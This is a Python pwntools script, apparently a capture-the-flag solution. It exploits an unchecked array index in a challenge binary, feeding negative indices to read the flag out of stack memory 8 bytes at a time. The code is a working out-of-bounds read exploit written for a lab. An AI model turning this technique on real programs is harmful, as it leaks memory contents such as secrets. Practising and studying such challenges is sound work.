from pwn import *

'''
this challenge allow user provide an index that to access an array buffer like this:

-> | xxxxxxxxx | stack pointer -> rsp
   | xxxxxxxxx |
   | xxxxxxxxx |
   | xxxxxxxxx |
   | xxxxxxxxx |
   | xxxxxxxxx |
-> | flag buff |
   | flag buff |
   | flag buff |
   | flag buff |
   | flag buff |
   | xxxxxxxxx |
   | xxxxxxxxx |
   | xxxxxxxxx |
-> | user buff |
   | user buff |
   | user buff |
   | user buff |
   | user buff |

scanf("%d", &index)
'''

context.binary = elf = ELF('/challenge/anomalous-array-hard')

# this offset for easy challenge
# flag_addr = 0xbd40
# input_addr = 0xc2d8
# start = int((input_addr - flag_addr) / 8)

# this for hard one
flagaddr = 0xeb80
inputaddr = 0xfaf8
start = int((inputaddr - flagaddr) / 8)
flag = b''

for i in range(-start, 0):
    io = elf.process()
    io.sendline(str(i).encode())
    io.recvuntil(b'Your hacker number is ')
    response = io.recvline().strip().decode()
    if '0' == response:         # end of the flag buffer
        break
    elif len(response) != 16:   # strip \n
        response = response[1:]

    flag += bytes.fromhex(response)[::-1]
    
print(f'[+] flag: {flag.decode()}')
